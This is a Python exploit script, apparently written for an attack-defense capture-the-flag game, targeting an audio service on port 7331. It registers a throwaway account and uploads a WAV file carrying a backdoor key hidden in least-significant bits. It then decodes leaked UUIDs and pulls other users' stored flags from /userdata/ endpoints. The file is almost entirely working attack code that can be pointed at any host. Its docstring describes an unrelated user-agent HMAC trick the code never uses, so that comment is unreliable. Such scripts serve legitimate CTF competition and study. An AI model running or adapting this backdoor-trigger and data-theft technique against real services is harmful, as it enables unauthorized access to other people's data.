import requests
import random
import re
from pathlib import Path

from usernames import generate_username, generate_password

def gen_random_sample():
    with open(Path(__file__).parent / 'snippet.wav','rb') as f:
        sample = f.read()
    
    data_start = sample.find(b'data')
    if data_start < 0:
        raise ValueError("Cannot find data chunk of sample")
    data_start += 8 # adjust for tag and length
    
    sample_len = random.randint(8*1024, 255*1024)
    sample_offset = random.randint(0, len(sample) - (data_start+1+sample_len))
    # find start of DATA chunk
    subsample = sample[8:data_start-4] + sample_len.to_bytes(4, 'little') + sample[data_start+sample_offset:data_start+sample_offset+sample_len]
    return b'RIFF' + len(subsample).to_bytes(4, 'little') + subsample

def encode_in_bit(buf, payload, bitpos=0):
    mask_set = 1<<bitpos
    mask_clear = (~mask_set) & 0xff
    assert len(buf) >= 8*len(payload)
    for i, x in enumerate(payload):
        for j in range(8):
            if x&(1<<j):
                buf[8*i+j] |= mask_set # set bit
            else:
                buf[8*i+j] &= mask_clear # clear bit


def decode_from_bit(buf, bitpos=0):
    out = bytearray()
    mask_bit = 1<<bitpos
    i = 0
    a = 0
    for x in buf:
        if x&mask_bit:
            a |= 1<<i
        i+=1
        if i == 8:
            out.append(a)
            a = 0
            i = 0
    return out

KEY = b'I am the h4ck0rm4n, you will never find this backdoor!'
def gen_payload(username, target_id):
    sample = gen_random_sample()
    data_start = sample.find(b'data')
    if data_start < 0:
        raise ValueError("Cannot find data chunk of sample")
    data_start += 8 # adjust for tag and length
    
    msg = KEY + target_id.to_bytes(1) + username.encode() + b'\x00'

    hdr, data = sample[:data_start], bytearray(sample[data_start:])

    encode_in_bit(data, msg, 0)

    return bytes(hdr+data)

PTN_FLAG = re.compile(rb"SAAR\{[A-Za-z0-9-_]{32}\}")
def print_flags(data):
    print('\n'.join(x.decode() for x in PTN_FLAG.findall(data)))

PTN_UUID = re.compile(rb"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")
def exploit_one(target, flag_id):
    """
    Flags stored in array can be retrieved by setting the useragent to contain the string "Firefox/133.7", which
    sets the effective HMAC key to [0,1,2,...,63]
    """
    s = requests.Session()
    
    # step 1: login as new user
    username = generate_username()
    password = generate_password()
    s.post(f"http://{target}:7331/api/login", json={"username":username, "password":password})
    
    # step 2: reverse a prepared audio file -> backdoor encoded in least-significant bit
    payload = gen_payload(flag_id, 0)
    r = s.post(f"http://{target}:7331/api/audio/new", headers={'Content-Type': 'application/octet-stream'}, data=payload)
    assert r is not None and r.ok
    r_id = r.json().get('id', None)
    assert r_id is not None
    
    # step 3: get reversed audio -> this should contain uuid of target
    r = s.get(f"http://{target}:7331/api/audio/{r_id}")
    assert r is not None and r.ok
    payload_data = r.content
    
    # step 4: decode uuid
    decoded = decode_from_bit(payload_data, 0)
    for uuid in PTN_UUID.findall(decoded):
        r = requests.get(f"http://{target}:7331/userdata/{uuid.decode()}")
        assert r is not None and r.ok
        print_flags(r.content)
        print_flags(r.content[::-1])

def exploit(target, flag_ids):
    flag_ids = ','.join(flag_ids).split(',')
    for flag_id in flag_ids:
        try:
            exploit_one(target, flag_id)
        except Exception as e:
            raise e
            print(e)
            pass


if __name__ == '__main__':
    import sys
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost', sys.argv[2:])
